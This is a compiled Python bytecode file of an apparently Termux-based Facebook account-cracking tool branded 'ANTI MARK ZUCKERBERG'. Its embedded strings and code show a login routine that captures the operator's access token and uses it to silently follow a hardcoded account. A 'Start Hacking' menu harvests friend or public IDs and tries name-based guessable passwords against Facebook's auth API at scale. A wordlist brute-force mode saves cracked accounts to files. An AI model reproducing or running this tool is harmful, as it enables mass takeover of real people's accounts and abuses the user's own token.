ó
c={_c           @   sg  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d d& g e _ d
   Z d   Z d   Z d   Z d Z d   Z  d Z! g  Z" g  a# g  a$ g  Z% g  Z& d Z' d Z( e  j) d  d GHd GHd GHd Z* d Z+ d Z, x_ e, d k re- d  Z. e. e* k re- d  Z/ e/ e+ k rd e. GHd Z, qd GHq¸d GHq¸Wd   Z0 d    Z1 d!   Z2 d"   Z3 d#   Z4 d$   Z5 e6 d% k rce0   n  d S('   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;96m[!] [1;91mExit(   t   ost   syst   exit(    (    (    s   /sdcard/amz3.pyt   keluar   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/amz3.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   /sdcard/amz3.pyR       s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/amz3.pyt   jalan*   s    sk  
[1;91m       â¦â¦â¦ââââââââââââââââââââââââââââââââ¦â¦â¦
[1;96m             âââââââââââââââââââââââââââ
[1;96m             âââââââââââââââââââââââââââ
[1;96m             âââââââââââââââââââââââââââ
[1;96m             âââââââââââââââââââââââââââ
[1;96m             âââââââââââââââââââââââââââ
[1;96m             âââââââââââââââââââââââââââ          
[1;91m       â¦â¦â¦ââââââââââââââââââââââââââââââââ¦â¦â¦
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mPlease Wait [1;93mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/amz3.pyt   tik<   s
      i    s   [31mNot Vulns	   [32mVulnt   clearsÍ  

[1;97m
[1;96mâââââââââââââââââââââââââââââââââ
[1;96mâââââââââââââââââââââââââââââââââ
[1;96mâââââââââââââââââââââââââââââââââ
[1;96mâââââââââââââââââââââââââââââââââ
[1;96mâââââââââââââââââââââââââââââââââ
[1;96mâââââââââââââââââââââââââââââââââ
                                                               

s   Welcome to AMZ Creations s   [1;97mâ¢ââ¢âââââââââââ¢ââ¢[1;96mANTI MARK ZUCKERBERG[1;97mâ¢ââ¢âââââââââââ¢ââ¢t   amzt   trues(   [1;96m[â] [1;97mUSER ID [1;96m>>>> s(   [1;96m[â] [1;97mPASWORD [1;96m>>>> s   Logged in successfully as t   falses   Password Salahs   Username Salahc          C   sµ  t  j d  y t d d  }  t   Wnt t f k
 r°t  j d  t GHd d GHd GHt d  } t d  } t   y t	 j d	  Wn  t
 j k
 r¯ d
 GHt   n Xt t	 j _ t	 j d d  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rRy!d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$  } | j |  | j   } | j i | d% 6 d& } t j | d' | } t j | j  }	 t d d(  }
 |
 j |	 d)  |
 j   d* GHt j d+ |	 d)  t   WqRt j  j! k
 rNd, GHt   qRXn  d- | k rd. GHt  j d/  t" j# d0  t   q±d1 GHt  j d/  t" j# d0  t$   n Xd  S(2   NR%   s	   login.txtt   ri2   s
   [1;96mâªs=             [1;97m[â] [1;96mLOGIN GUNAKAN VPN! [1;97m[â]s7             [1;97m[â] [1;97mID/Email [1;91m: [1;92ms7             [1;97m[â] [1;97mPassword [1;91m: [1;92ms   https://m.facebook.coms2   
[1;96m[!] [1;91mThere is no internet connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens$   
[1;36;40m[â] Login Successful...sM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s+   
[1;97m[!] There is no internet connectiont
   checkpoints)   
[1;97m[!] Your Account is on Checkpoints   rm -rf login.txti   s   
[1;97mPassword/Email is wrong(%   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputR$   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   t   login(   t   tokett   idt   pwdt   urlR=   t   dataR   t   aR)   R   t   unikers(    (    s   /sdcard/amz3.pyR^   x   sh    	
S

c          C   s©  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xyv t j	 d |   } t
 j | j  } | d } | d	 } t j	 d
 |   } t
 j | j  } t | d d  } Wnf t k
 r)t  j d  d GHt  j d  t j d  t   n# t j j k
 rKd GHt   n Xt  j d  t GHd GHd | d GHd | d GHd | d GHd GHd GHd GHd GHt   d  S(   NR%   s	   login.txtR)   s   [1;97m[!] Token invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameR`   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts$   [1;97mYour Account is on Checkpoints&   [1;97mThere is no internet connections|      [1;36;40m      âââââââââââââââââââââââââââââââââââs4      [1;36;40m      â[1;32;40m[*] Name[1;32;40m: s     	   [1;36;40mâs4      [1;36;40m      â[1;34;40m[*] ID  [1;34;40m: s           [1;36;40mâs4      [1;36;40m      â[1;34;40m[*] Subs[1;34;40m: s#                         [1;36;40mâs|      [1;36;40m      âââââââââââââââââââââââââââââââââââs+   [1;32;40m[1] [1;33;40mââStart Hackings(   [1;32;40m[2] [1;33;40mââUpdate AMZs%   [1;32;40m[0] [1;33;40mââLog out(   R   RA   RB   t   readRE   R   R   R^   RV   RW   RX   RY   RZ   R   RD   R]   R   R   RF   t   pilih(   R_   t   otwRd   t   namaR`   t   otsR   t   sub(    (    s   /sdcard/amz3.pyRC   ³   sJ    


c          C   s¾   t  d  }  |  d k r' d GHt   n |  d k r= t   n} |  d k r t j d  t GHd GHt j d  t  d	  t   n9 |  d
 k r® t d  t j d  t   n d GHt   d  S(   Ns   
[1;31;40m>>> [1;35;40mR
   s   [1;97mFill in correctlyR3   t   2R%   s¨    [1;36;40mâââââââââââââââââââââââââââºâââââââââââââââââââââââââ
s   git pull origin masters   
[1;97m[ [1;97mBack [1;97m]R9   s   Token Removeds   rm -rf login.txt(	   RG   Rj   t   superR   RA   RF   RC   R!   R   (   Re   (    (    s   /sdcard/amz3.pyRj   Ú   s&    





c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR%   s	   login.txtR)   s   [1;97mToken invalids   rm -rf login.txti   s3   [1;32;40m[1] [1;33;40mââHack From Friend Lists1   [1;32;40m[2] [1;33;40mââHack From Public IDs-   [1;32;40m[3] [1;33;40mââHack Bruteforces,   [1;32;40m[4] [1;33;40mââHack From Files"   [1;32;40m[0] [1;33;40mââBack(   R   RA   RB   Ri   R_   RE   R   R   R^   RF   t   pilih_super(    (    (    s   /sdcard/amz3.pyRp   ð   s     c          C   sN  t  d  }  |  d k r' d GHt   n;|  d k r t j d  t GHt d  t j d t  } t	 j
 | j  } xë| d D] } t j | d	  q WnÅ|  d
 k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r.d GHt  d  t   n Xd GHt j d | d t  } t	 j
 | j  } xþ | d D] } t j | d	  qlWnØ |  d k r²t j d  t GHt   n° |  d k r@t j d  t GHyC t  d  } x0 t | d  j   D] }	 t j |	 j    qõWWqbt k
 r<d GHt  d  t   qbXn" |  d k rVt   n d GHt   d t t t   GHt d  d d d g }
 x0 |
 D]( } d  | Gt j j   t j d!  qWd" GHd# GHt d$  d% GHd&   } t d'  } | j | t  d( GHd) t t t   d* t t t    GHd+ GHd, GHt  d-  t   d  S(.   Ns   
[1;31;40m>>> [1;97mR
   s   [1;97mFill in correctlyR3   R%   s#   [1;97m[âº] Getting IDs [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rc   R`   Ro   s   [1;97m[*] Enter ID : s   https://graph.facebook.com/s   ?access_token=s   [1;31;40m[âº] Name : Rf   s   [1;97m[âº] ID Not Found!s   
[1;97m[[1;97mBack[1;97m]s   [1;35;40m[âº] Getting IDs...s   /friends?access_token=t   3t   4s6   [1;97m[+] [1;97mEnter the file name [1;97m: [1;97mR)   s&   [1;35;40m[!] [1;35;40mFile not founds'   
[1;35;40m[ [1;35;40mExit [1;35;40m]R9   s#   [1;36;40m[âº] Total IDs : [1;97ms   [1;34;40m[âº] Please Wait...s   .   s   ..  s   ... s   [1;32;40m[âº] Cloning[1;97mi   sJ   
[1;97m        â     [1;97mTo Stop Process Press CTRL+Z [1;97m    âs      [1;31;48mâðââââââââââââââââââââºââââââââââââââââââðâs4                       [1;97mAMZ start cloning Wait...s     [1;36;48m âðââââââââââââââââââââºââââââââââââââââââðâc         S   sÎ  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rÔ d
 | d | d | d GHt j | |  nëd | d k rGd | d | d | d GHt d d  } | j | d | d  | j   t j | |  nx| d d } t	 j
 d | d | d  } t j |  } d	 | k rÀd
 | d | d | d GHt j | |  nÿd | d k r3d | d | d | d GHt d d  } | j | d | d  | j   t j | |  n| d d }	 t	 j
 d | d |	 d  } t j |  } d	 | k r¬d
 | d |	 d | d GHt j | |	  nd | d k rd | d |	 d | d GHt d d  } | j | d |	 d  | j   t j | |
  n | d d }
 t	 j
 d | d |
 d  } t j |  } d	 | k rd
 | d |
 d | d GHt j | |
  n'd | d k rd | d |
 d | d GHt d d  } | j | d |
 d  | j   t j | |
  n´d } t	 j
 d | d | d  } t j |  } d	 | k r|d
 | d | d | d GHt j | |  nCd | d k rïd | d | d | d GHt d d  } | j | d | d  | j   t j | |  nÐ| d d } t	 j
 d | d | d  } t j |  } d	 | k rhd
 | d | d | d GHt j | |  nWd | d k rÛd | d | d | d GHt d d  } | j | d | d  | j   t j | |  nä d } t	 j
 d | d | d  } t j |  } d	 | k rLd
 | d | d | d GHt j | |  ns d | d k r¿d | d | d | d GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   786s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R?   s   [1;97m[Login Now] [1;97m s    [1;97m | [1;97m s    ð½ Rf   s   www.facebook.comt	   error_msgs   [1;36;40m[After24Hr] [1;97m s    [1;36;40m|[1;97m s
   out/CP.txtRd   t   |s   
t   123s   [1;36;40m[Checkpoint] [1;97m t   12345t   1234t   786786t	   last_namet   Pakistan(   R   t   mkdirt   OSErrorRV   RW   R_   RX   RY   RZ   t   urllibt   urlopent   loadt   okst   appendRB   R   R[   t   cekpoint(   t   argt   userRd   R   t   pass1Rc   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   /sdcard/amz3.pyt   mainD  s¼    






i   s5   [1;31;40m[â] Process Has Been Completed[1;97m....s1   [1;32;40m[+] Total OK/[1;97mCP [1;97m: [1;97ms   [1;31;40m/[1;36;40ms2   [1;34;40m[+] CP File Has Been Saved : save/cp.txts´   
[1;31;40m âââââââââââââââââââââââââââºâââââââââââââââââââââââââ
           s   
[1;97m[[1;97mExit[1;97m](!   RG   Rq   R   RA   RF   R!   RV   RW   R_   RX   RY   RZ   R`   R   RD   Rp   t   bruteRB   t	   readlinest   stripRE   RC   R   R   R   R   R   R   R   R    t   mapR   R   (   t   peakR)   R   t   st   idtt   jokt   opR   t   idlistt   lineR"   R#   R   t   p(    (    s   /sdcard/amz3.pyRq     s    






  
	n)
c    
      C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n.Xt  j d  t GHd GHyñt	 d  } t	 d	  } t | d  } | j
   } d GHd
 | GHd t t |   d GHt d  t | d  } xw| D]o} y=| j d d  } t j j d |  t j j   t j d | d | d  } t j | j  } d | k rÉt d d  } | j | d | d  | j   d GHd d GHd | GHd | GHt   nm d | d k r6t d d  }	 |	 j | d | d  |	 j   d GHd  GHd! GHd | GHd | GHt   n  Wqô t j j k
 rbd" GHt j d#  qô Xqô WWn" t k
 rd$ GHd% GHt   n Xd  S(&   NR%   s	   login.txtR)   s   [1;97m[!] Token not founds   rm -rf login.txtg      à?s§   [1;31;40m âââââââââââââââââââââââââââºâââââââââââââââââââââââââsG   [1;97m[+] [1;97mID[1;97m/[1;97mEmail [1;97mTarget [1;97m:[1;97m s@   [1;97m[+] [1;97mWordlist [1;97mext(list.txt) [1;97m: [1;97ms9   [1;97m[[1;97mâ[1;97m] [1;97mTarget [1;97m:[1;97m s   [1;97m[+] [1;97mTotal[1;97m s    [1;97mPasswords*   [1;97m[âº] [1;97mPlease wait [1;97m...s   
R
   s.   [1;97m[[1;97mâ¸[1;97m] [1;97mTry [1;97ms   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R?   s	   Brute.txtR   s    | s   
[1;97m[+] [1;97mFounded.i4   s
   [1;97mâs-   [1;97m[â¹] [1;97mUsername [1;97m:[1;97m s-   [1;97m[â¹] [1;97mPassword [1;97m:[1;97m s   www.facebook.comRw   s   Brutecekpoint.txts§   [1;36;40m âââââââââââââââââââââââââââºâââââââââââââââââââââââââs*   [1;97m[!] [1;97mAccount Maybe Checkpoints   [1;97m[!] Connection Errori   s   [1;97m[!] File not found...s7   
[1;97m[!] [1;97mLooks like you don't have a wordlist(   R   RA   RB   Ri   RE   R   R   R^   RF   RG   R   R   R   R!   R   R   R   R   R   RV   RW   RX   RY   RZ   R[   R   R]   R   Rp   (
   R_   R+   t   passwt   totalt   sandit   pwRc   t   mpsht   dapatt   ceks(    (    s   /sdcard/amz3.pyR   ¾  sl    	

			

		t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(7   R   R   R   t   datetimeR   RR   t   ret	   threadingRX   R   t	   cookielibRV   RI   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRH   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R!   RF   R$   t   backt   berhasilR   R   R`   t   listgrupt   vulnott   vulnRA   t   CorrectUsernamet   CorrectPasswordt   loopRG   t   usernameR/   R^   RC   Rj   Rp   Rq   R   t   __name__(    (    (    s   /sdcard/amz3.pyt   <module>   s^   
			
						;	'			»	;